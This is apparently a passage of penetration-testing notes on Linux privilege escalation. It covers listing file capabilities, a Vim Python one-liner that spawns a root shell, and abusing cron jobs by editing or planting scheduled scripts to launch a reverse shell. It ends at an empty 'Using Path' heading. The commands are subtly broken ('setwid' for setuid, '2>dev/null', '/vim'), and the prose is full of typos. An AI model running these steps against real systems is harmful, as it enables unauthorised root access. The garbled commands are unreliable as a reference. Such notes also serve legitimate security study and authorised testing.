## Using Capqabilities

List capabilities using the following command:
`getcap -r / 2>dev/null`

IF `Vim` listed use to launch root shell:
`/vim -c ':py3 import os; os.setwid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'`

_Note: For Binaries use `GTFObins` which has a good list of bianries that can be leveraged fro privilege escalation._

# Using Cron Jobs

Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions.

Cron Jobs configs are stored in cron tabs `cat /etc/crontab`.

Users can find executable script and modify it to launch reverse shell.

- Sometimes old scripts are deleted from source directory but not from cron jobs. Users can create fake cron jobs under their profile and Crpn Jobs will run the malicous executables.

# Using Path
